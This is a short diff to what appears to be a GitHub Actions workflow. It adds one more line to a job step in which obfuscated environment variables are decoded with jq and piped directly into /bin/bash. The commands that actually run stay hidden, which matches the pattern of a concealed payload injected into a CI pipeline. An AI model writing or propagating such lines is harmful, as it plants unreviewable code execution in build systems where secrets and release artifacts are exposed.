@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$s3066" | jq -r .h512 | /bin/bash
           printf '%s' "$iqk0" | jq -r .qva75 | /bin/bash
           printf '%s' "$pnb81" | jq -r .hh9991 | /bin/bash
+          echo $j2 | jq -r .qmghm5376 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
